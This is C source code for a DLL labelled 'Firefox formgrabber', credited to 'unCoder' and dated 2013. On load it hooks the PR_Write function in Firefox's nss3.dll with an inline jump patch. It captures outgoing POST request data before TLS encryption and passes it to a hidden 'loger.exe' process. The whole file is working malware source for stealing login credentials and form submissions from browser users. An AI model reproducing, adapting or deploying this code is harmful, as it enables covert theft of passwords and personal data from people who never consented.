
/* 
 * 
 * Firefox formgrabber
 * Tested on : Firefox lastest version ( 23.0.1 ) - Windows 7 and 8 | 32 - 64 bit 
 * Coded By  : unCoder
 * Website   : www.dpcoders.com
 * 
 * all rights reserved | unCoder | Thursday, September 12, 2013
 * 
 */

#pragma comment(lib,"wininet.lib")

#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

LPVOID OldPR_WRITE;
char *buffer = (char*)malloc(1024);
char*buffer_2 = (char*)malloc(1024);

__declspec(naked) void _CallBack()
{

	__asm {
			PUSH EBP
			MOV EBP,ESP
			PUSHAD

			MOV EDI, [EBP+0x10] 
			MOV buffer,EDI

			MOV EDI, [EBP+0xB0] 
		    MOV buffer_2,EDI
	}

	// HTTPS [ EBP + 0x10 ]
	if (IsBadReadPtr((void*)buffer,10) == 0) {
		if(memcmp(buffer,"POST",4)==0){
			ShellExecuteA(0, "open", "loger.exe",buffer, NULL, SW_HIDE);

		}
	} 
	
	
	// HTTP + HTTPS SE [ EBP 0xB0 ]
	if (IsBadReadPtr((void*)buffer_2,10) == 0) {
		if(memcmp(buffer_2,"POST",4)==0){
		ShellExecuteA(0, "open", "loger.exe",buffer_2, NULL, SW_HIDE);
		}
	}  
	

	__asm {		POPAD 
				MOV ESP,EBP 
				POP EBP 
				RETN  
	      }
	
	

}

void DoHook()
{
	DWORD JmpCalc;

	OldPR_WRITE = GetProcAddress(GetModuleHandleA("nss3.dll"),"PR_Write");
	LPVOID NewPR_WRITE = VirtualAlloc(0,100,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	DWORD OldProtect = NULL;
	VirtualProtect(OldPR_WRITE,20,PAGE_EXECUTE_READWRITE,&OldProtect);


	char old6Bytes[6] = {0};
	memcpy(old6Bytes,OldPR_WRITE,6);


	char new6Bytes[6] = { 0xE9,0x00,0x00,0x00,0x00,0x90 };

	JmpCalc = (DWORD)NewPR_WRITE - (DWORD)OldPR_WRITE - 5;
	memcpy(&new6Bytes[1],&JmpCalc,4);

	memcpy(OldPR_WRITE,new6Bytes,6);

	char new666Bytes[6] = { 0xE8,0x00,0x00,0x00,0x00,0x90 };
	char new66Bytes[6] = { 0xE9,0x00,0x00,0x00,0x00,0x90 };

	JmpCalc = (DWORD)OldPR_WRITE - (DWORD)NewPR_WRITE - 11;
	memcpy(&new66Bytes[1],&JmpCalc,4);

	//
	JmpCalc = (DWORD)_CallBack - (DWORD)NewPR_WRITE - 11;
	memcpy(&new666Bytes[1],&JmpCalc,4);
	//

	memcpy(NewPR_WRITE,old6Bytes,6);

	DWORD nPR = (DWORD)NewPR_WRITE +6;
	memcpy((void*)nPR,new666Bytes,6);

	nPR = (DWORD)NewPR_WRITE +12;
	memcpy((void*)nPR,new66Bytes,6);
	
	VirtualProtect(OldPR_WRITE,6,OldProtect,NULL);

}


BOOL APIENTRY DllMain(HMODULE hMod,DWORD Res,LPVOID resv)
{

	if(Res == DLL_PROCESS_ATTACH)
	{
		DoHook();
	}

	return TRUE;
}
